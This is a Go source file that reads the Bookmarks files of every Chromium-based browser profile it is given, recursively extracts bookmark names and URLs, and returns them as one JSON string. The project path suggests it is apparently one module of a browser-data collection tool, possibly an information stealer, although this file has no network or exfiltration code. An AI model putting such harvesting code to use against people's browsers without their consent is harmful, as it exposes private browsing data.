package bookmarksChromium

import (
	"encoding/json"
	"kdot/kematian/browsers/structs"
	"os"
)

type Bookmarks struct {
	Name string `json:"name"`
	Url  string `json:"url"`
}

func Get(browsersList []structs.Browser) string {
	var bookmarks []Bookmarks
	for _, browser := range browsersList {
		if !browser.IsChromium {
			continue
		}
		for _, profile := range browser.Profiles {
			path := profile.Bookmarks

			file, err := os.ReadFile(path)
			if err != nil {
				continue
			}

			var bookmarkData map[string]interface{}
			if err := json.Unmarshal(file, &bookmarkData); err != nil {
				continue
			}

			roots, ok := bookmarkData["roots"].(map[string]interface{})
			if !ok {
				continue
			}

			extractBookmarks(roots, &bookmarks)
		}
	}
	jsonData, err := json.MarshalIndent(bookmarks, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}

func extractBookmarks(data map[string]interface{}, bookmarks *[]Bookmarks) {
	for key, value := range data {
		if key == "bookmark_bar" || key == "other" || key == "synced" {
			folder, ok := value.(map[string]interface{})
			if !ok {
				continue
			}
			extractFromFolder(folder, bookmarks)
		}
	}
}

func extractFromFolder(folder map[string]interface{}, bookmarks *[]Bookmarks) {
	children, ok := folder["children"].([]interface{})
	if !ok {
		return
	}
	for _, child := range children {
		childMap, ok := child.(map[string]interface{})
		if !ok {
			continue
		}
		if childMap["type"] == "url" {
			*bookmarks = append(*bookmarks, Bookmarks{
				Name: childMap["name"].(string),
				Url:  childMap["url"].(string),
			})
		} else if childMap["type"] == "folder" {
			extractFromFolder(childMap, bookmarks)
		}
	}
}
